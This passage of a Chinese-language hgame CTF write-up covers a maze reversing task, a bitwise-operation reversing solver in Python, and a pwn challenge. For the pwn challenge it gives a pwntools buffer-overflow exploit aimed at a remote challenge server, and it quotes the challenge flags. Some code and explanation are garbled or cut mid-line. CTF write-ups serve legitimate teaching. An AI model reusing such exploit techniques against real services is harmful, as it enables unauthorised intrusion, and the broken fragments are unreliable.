    v5=[0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x0,0x0,0x0,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x0,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0]
    #print len(v5)
    for i in range(len(v5)):
        if (i+1)%16==0:
            print v5[i]
        else:
            print v5[i],
阅读代码 我们可以得到 wasd 为 分别控制上左右下的 字符  
从左上角的第一个 0 走到 右下角 得到 ssssddddddsssssddwwdddssssdssdd  
最后 加上 hgame{} 即 flag ：
    hgame{ssssddddddsssssddwwdddssssdssdd}
# 0x04: bitwise_operation2
这道题 真的是 re里出的很好的一道题，  
照常一下，拖入ida:,  
先看第一部分，这里其实要求输入 39 个字符串，除去开始的 hgame{ 和最一个 }还剩32个  
因为 v6，v7，v8,v9,v10,v11,v12,v13 在连续的，其实可以用数组V6[8] 去理解它们的
v6是 数组首地址，后面的 在数组中元素嘛
即 在这里我们知道了： V6= [76,60,214,54,80,136,32,204]
然后  
我们进去看下 sub_400616()函数  
可以知道 它其实是 将 一个字符串的每两个 字符 分别转化为 16进制数然后合成 一个 1个字符， 举个列子：
    “4b” -> chr(0x4b) ->”K”
所以第一部分：将是相当于 我们输入的 32个字符串 前 16个字符经上面函数处理成 8个字符存在与 V14 中 ，后16个字符经上面函数处理成
8个字符存在与 V16 中，  
然后下面有3 个 for 循环：  
我们逆着来， 先分析 最后一个：
经过最后一个 for循环得到v16（代码中记录为 VV16） 应该为 "Easylif3"
而经过 第二个 for循环的到的 v14（代码中记录为 VV14） 应该为 “e4sy _Re_ ：
关于位运算这里 有个小规律：  
从而我们写出 python 脚本 跑出 第一个 for循环 v16 应该为的 内容
    #coding:utf8
    v6=[76,60,214,54,80,136,32,204]
    vv14='e4sy_Re_'
    vv16="Easylif3"
    v16=[]
    v14=[]
    for k in range(8):
        v16.append(ord(vv14[k])^(v6[k])^ord(vv16[k]))
    print v16#[108, 105, 214, 54, 99, 179, 35, 160]
然后看 第二个 for循环：  
这个更简单些，我们可以 很容易得到 第一个 for循环 v16 应该为的 内容
    for j in range(8):
        v14.append(ord(vv14[j])^(v6[j]))
    print v14#[41, 8, 165, 79, 15, 218, 69, 147]
最后 我们看第一个 for循环：  
我们相应着 将这个for循环中的 四个 表达式 倒着再循环过来即可，注意要记得将第一个 表达式的 >>5 变成>3
哦哦，这里要注意下 关于在ida 中并不是所有 反编译 都是完全 正确的，我们查看汇编 发现 **8 其实就是 >1 | v14[i]&0xAA
        v16[7-i]=(v14[i]&0x55)>1 | v14[i] &0xAA
        v14[i]=v14[i]&0xE0>3
    # print v14
    # print v16
    for i in range(8):
        v14[i]=hex(v14[i])
        v16[i]=hex(v16[i])
    print v14
    print v16
得到结果：
    V14:['0xf', '0x3', '0x1e', '0x3', '0x3', '0x19', '0x2', '0x12']
    V16:['0x66', '0xcb', '0xf4', '0x1e', '0xcb', '0x1b', '0x1', '0x2']
而根据我们前面的分析 我们输入的字符串 就是 “hgame{“ +v14+v16+}
即 # hgame{ 0f233e63637982d266cbf41ecb1b0102 }
# 0x05 Hard_AAAAA
首先用file命令 检查下 文件属性：
    file Hard_AAAAA
    Hard_AAAAA: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, 
    BuildID[sha1]=5c5c4e8b21a1b4ef48330e486d89a5064da74169, not stripped
然后用checksec 命令查看下 该程序开启了什么保护。
    checksec Hard_AAAAA
    [*] 
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found         //开启了 Canary 保护
        NX:       NX enabled
    PIE:      No PIE (0x8048000)
于是拖入 ida(32):  
这道题很简单，再将之前我们 得去 详细了解下 memcmp函数 （比较内存块大小的函数）：  
这个很关键：
    int memcmp ( const void * ptr1, const void * ptr2, size_t num );
    //ptr1 ，ptr2 是指向内存块得指针
    //num 是要比较得字节数
将ptr1指向的内存块的第一个num字节与ptr2指向的第一个num字节进行比较，  
如果它们都匹配，则返回零；  
如果不匹配，且ptr1中的值 比 ptr2 中的值 小 返回 0 的 int 值  
请注意，与strcmp不同，该函数在找到空字符后不会停止比较。
给个 demo：
    #include 
    #include 
    int main ()
    {
      char zise_1[] = "zise_yangwang";
      char zise_2[] = "zise_YangWang";
      int n;
      n=memcmp ( zise_1, zise_2, sizeof(zise_1) );
      if (n>0) printf ("'%s' is greater than '%s'.\n",zise_1,zise_2);
      else if (nY(89)
或许，在这之前很多人 在看到第3个参数 7 的时候 就很懵，不应该是 4 嘛，所以，现在看完上面的 知识 就能很明白了，
所以 这题， 的关键 判断 就是要 求 v5的所在内存块中 前 7字节的内容 与 "0O0o"
所在内存块中 前 7字节的内容 相等。即可触发 后门函数， 从而 pwn 掉程序
!memcmp("0O0o", &v5, 7u)
我们通过 动态调试 ，参数arg0 是 第一个参数 地址 arg1 是我们构造的第二个参数 ， arg2 是 7  
我们通过 命令 x/10x 0x80486e0 得到 前七个 字节内容是 "0O0o"+'\x00'+'O0'  
所以 写 exp：
    #coding:utf-8
    from pwn import *
    context.log_level='debug'
    io = process("./Hard_AAAAA")
    io = remote('47.103.214.163',20000)
    payload = 'a'*(0xAC-0x31)+"0O0o"+'\x00'+'O0'        
    #payload += p64(get_flag_addr)  #将EIP劫持到get_flag_addr
    io.recvuntil("Let's 0O0o\\0O0!")
    #gdb.attach(io,'b *0x08048605')
    #pause()
    io.sendline(payload)    
    io.interactive()#hgame{0OoO0oo0O0Oo}
# 0x06 One_Shot
首先用file命令 检查下 文件属性：
    file One_Shot
    One_Shot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, 
    BuildID[sha1]=68e45f253cdc8253dce50c56a1eed3f9708d1fae, not stripped
然后用checksec 命令查看下 该程序开启了什么保护。
    checksec One_Shot
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
拖入ida：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      _BYTE *v4; // [rsp+8h] [rbp-18h]
      int fd[2]; // [rsp+10h] [rbp-10h]
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      v4 = 0LL;